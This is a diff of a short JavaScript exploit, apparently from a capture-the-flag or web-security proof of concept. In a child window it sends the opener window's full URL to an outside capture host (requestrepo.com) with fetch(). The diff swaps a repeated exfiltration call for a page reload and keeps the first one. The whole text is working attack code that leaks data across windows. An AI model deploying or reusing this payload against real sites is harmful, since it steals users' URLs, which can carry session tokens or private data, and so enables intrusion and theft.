@@ -8,7 +8,7 @@ if (window.location.hash == '#child') {
   console.log('sleeping');
   fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
   sleep(1000).then(() => {
-    fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
+    window.location.reload();
   });
 } else if (window.location.hash == "") {
   // Open child window
